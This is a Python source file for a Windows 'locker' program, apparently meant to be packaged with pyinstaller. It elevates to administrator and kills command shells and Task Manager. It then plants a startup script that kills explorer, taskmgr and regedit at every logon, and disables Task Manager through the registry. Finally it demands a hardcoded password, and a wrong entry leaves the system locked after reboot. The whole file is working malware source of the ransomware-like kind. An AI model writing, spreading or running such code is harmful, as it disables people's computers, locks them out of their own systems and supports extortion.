import os
import sys
import ctypes
import shutil
import time
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    sys.exit()
def m_function():
    os.system("taskkill /im cmd.exe /f")
    time.sleep(0.15)
    os.system("cls")
    time.sleep(0.05)
    os.system("taskkill /im powershell.exe /f")
    time.sleep(0.15)
    os.system("cls")
    time.sleep(0.05)
    os.system("taskkill /im WindowsTerminal.exe /f")
    time.sleep(0.15)
    os.system("taskkill /im taskmgr.exe /f")
    time.sleep(0.05)
    os.system("cls")
    time.sleep(8)
    os.system("cls")
    with open("a34h6940382kflds93k3dmc.cmd", "a") as abc:
        abc.write("@echo off" \
        "\ntaskkill /im explorer.exe /f && taskkill /im taskmgr.exe /f && taskkill /im regedit.exe /f" \
        "\nexit")
    user_profile = os.environ['USERPROFILE']
    destination = os.path.join(user_profile, r"AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a34h6940382kflds93k3dmc.cmd")
    shutil.move("a34h6940382kflds93k3dmc.cmd", destination)
    cmd_path_a = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'a34h6940382kflds93k3dmc.cmd'
    )
    os.system(f'start "" "{cmd_path_a}"')
    os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    print("Your PC is locked. It your enter password when PC normal!")
    password_a = input("Enter password: ")
    if (password_a == "A637I829"):
        print("Yep. Please wait for the computer to be restored...")
        time.sleep(5)
        os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f")
        startup_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        cmd_file = os.path.join(startup_path, 'a34h6940382kflds93k3dmc.cmd')
        os.remove(cmd_file)
        os.system("start explorer.exe")
        time.sleep(10)
        os.system("shutdown -r -t 0")
    else:
        print("Wrong password. Your computer will no longer be restored.")
        time.sleep(10)
        os.system("shutdown -r -t 0")
print("WARNING: This application has the potential to harm your computer.")
your_choose_a = input(("Your want start application? (Yes/No) == "))
if (your_choose_a == "y"):
    m_function()
elif (your_choose_a == "Y"):
    m_function()
elif (your_choose_a == "yes"):
    m_function()
elif (your_choose_a == "Yes"):
    m_function()
elif (your_choose_a == "yEs"):
    m_function()
elif (your_choose_a == "yeS"):
    m_function()
elif (your_choose_a == "YEs"):
    m_function()
elif (your_choose_a == "YeS"):
    m_function()
elif (your_choose_a == "yES"):
    m_function()
elif (your_choose_a == "YES"):
    m_function()
elif (your_choose_a == "y "):
    m_function()
elif (your_choose_a == "Y "):
    m_function()
elif (your_choose_a == "yes "):
    m_function()
elif (your_choose_a == "Yes "):
    m_function()
elif (your_choose_a == "yEs "):
    m_function()
elif (your_choose_a == "yeS "):
    m_function()
elif (your_choose_a == "YEs "):
    m_function()
elif (your_choose_a == "YeS "):
    m_function()
elif (your_choose_a == "yES "):
    m_function()
elif (your_choose_a == "YES "):
    m_function()
elif (your_choose_a == "y  "):
    m_function()
elif (your_choose_a == "Y  "):
    m_function()
elif (your_choose_a == "yes  "):
    m_function()
elif (your_choose_a == "Yes  "):
    m_function()
elif (your_choose_a == "yEs  "):
    m_function()
elif (your_choose_a == "yeS  "):
    m_function()
elif (your_choose_a == "YEs  "):
    m_function()
elif (your_choose_a == "YeS  "):
    m_function()
elif (your_choose_a == "yES  "):
    m_function()
elif (your_choose_a == "YES  "):
    m_function()
elif (your_choose_a == "n"):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "N"):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "no"):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "No"):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "nO"):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "NO"):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "n "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "N "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "no "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "No "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "nO "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "NO "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "n  "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "N  "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "no  "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "No  "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "nO  "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
elif (your_choose_a == "NO  "):
    print("Oh! This application closing...")
    time.sleep(6)
    os.system("exit")
else:
    print("Your choose is wrong.")
    time.sleep(6)

# pyinstaller --onefile Locker097I8KF5.py
